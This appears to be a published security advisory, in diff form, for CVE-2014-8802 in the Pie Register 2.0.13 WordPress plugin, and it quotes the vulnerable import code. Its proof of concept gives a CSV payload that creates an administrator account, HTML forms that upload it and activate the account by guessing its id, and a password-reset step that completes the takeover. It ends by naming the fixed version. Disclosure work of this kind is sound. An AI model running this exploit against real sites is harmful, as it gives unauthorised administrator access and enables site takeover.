@@ -1,0 +1,61 @@
+# Exploit Title: Pie Register 2.0.13 Privilege escalation
+# Date: 16-10-2014
+# Software Link: https://wordpress.org/plugins/pie-register/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# CVE: CVE-2014-8802
+# Category: webapps
+
+1. Description
+  
+Anyone can import CSV file. Pie Register will import users from this file.
+
+File: pie-register\pie-register.php
+
+add_action( 'init', array($this,'pie_main') );
+function pie_main() {
+	// I skip unnecessary lines
+	if(isset($_FILES['csvfile']['name'])) {
+		$this->importUsers();
+	}
+}
+
+http://security.szurek.pl/pie-register-2013-privilege-escalation.html
+
+2. Proof of Concept
+
+Create CSV file based on given example:
+
+"Username","Display name","E-mail","User Registered","First Name","Last Name","Nickname","Role"
+"hack","Hacked","hacked@hacked.hacked","2010-10-10 20:00:00","Hacked","Hacked","Hacked","administrator"
+
+Import account using:
+
+<form method="post" action="http://wordpress-instalation" enctype="multipart/form-data">
+    Input CSV<input type="file" name="csvfile">
+    <input type="submit" value="Add user!">
+</form>
+
+Create another standard account using wp-login.php?action=register.
+
+After login go to wp-admin/profile.php and search "uid" in page source.
+
+Number after "uid" is our current account id. For example: "uid":"123".
+
+We can assume that previously imported admin account has id-1 (or id-x where x is natural number).
+
+We can activate this account using:
+
+<form method="post" action="http://wordpress-instalation">
+    <input type="hidden" name="verifyit" value="1">
+    Account id:<input type="text" name="vusers[]" value="">
+    <input type="submit" value="Activate user!">
+</form>
+
+Finally we can reset password using: http://wordpress-instalation/wp-login.php?action=lostpassword
+  
+3. Solution:
+  
+Update to version 2.0.14
+https://downloads.wordpress.org/plugin/pie-register.2.0.14.zip
